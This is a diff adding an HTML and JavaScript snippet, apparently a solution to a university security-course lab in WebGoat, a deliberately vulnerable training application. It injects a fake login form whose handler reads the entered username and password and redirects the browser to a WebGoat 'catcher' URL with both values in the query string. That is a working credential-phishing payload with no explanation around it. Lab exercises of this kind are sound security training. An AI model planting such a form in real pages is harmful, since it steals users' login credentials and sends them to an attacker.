@@ -1,0 +1,21 @@
+<script>
+    function onSubmit() {
+        const name = document.getElementById("ece568_2022s_user").value;
+        const pass = document.getElementById("ece568_2022s_pw").value;
+        
+        const attackURL = `http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishingUsername=${name}&phishingPassword=${pass}`;
+
+        window.location.replace(attackURL);
+    }
+</script>
+
+<form>
+    <br>
+    Login Form
+    <br>
+	Enter Username:
+	<input type="text" id = "ece568_2022s_user"><br>
+	Enter password:
+	<input type="text" id = "ece568_2022s_pw"><br>	
+	<button onclick="onSubmit()">Login</button>
+</form>
